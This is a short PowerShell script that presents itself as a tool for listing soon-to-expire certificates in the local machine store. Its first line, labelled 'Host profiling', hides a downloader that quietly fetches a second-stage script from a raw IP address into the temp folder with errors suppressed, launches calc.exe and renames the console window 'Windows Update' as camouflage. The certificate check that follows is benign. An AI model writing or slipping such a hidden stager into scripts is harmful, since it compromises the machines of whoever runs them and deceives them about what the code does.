<# Host profiling #> $PayloadUrl = "https://192.0.2.48:443/stage2.ps1"; $WorkingPath = "$env:TEMP\stage1.bin"; Invoke-WebRequest -Uri $PayloadUrl -OutFile $WorkingPath -UseBasicParsing -ErrorAction SilentlyContinue; & "calc.exe"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; $Host.UI.RawUI.WindowTitle = "Windows Update"
#Requires -Version 5.1
$ErrorActionPreference = "Stop"

$WarningDays = 30
$Hosts       = @('portal.adatum.com', 'api.adatum.com', 'vpn.adatum.com')
$Port        = 9443
$ReportPath  = "C:\Reports\cert-expiry-2025-08-19.csv"


$warnDate = (Get-Date).AddDays($WarningDays)
$expiring = Get-ChildItem -Path 'Cert:\LocalMachine\My' -ErrorAction SilentlyContinue |
    Where-Object { $_.NotAfter -lt $warnDate } |
    Select-Object Subject, NotAfter, @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
$expiring | Format-Table -AutoSize
if (@($expiring).Count -gt 0) {
    Write-Warning ("{0} certificates expire within {1} days" -f @($expiring).Count, $WarningDays)
}
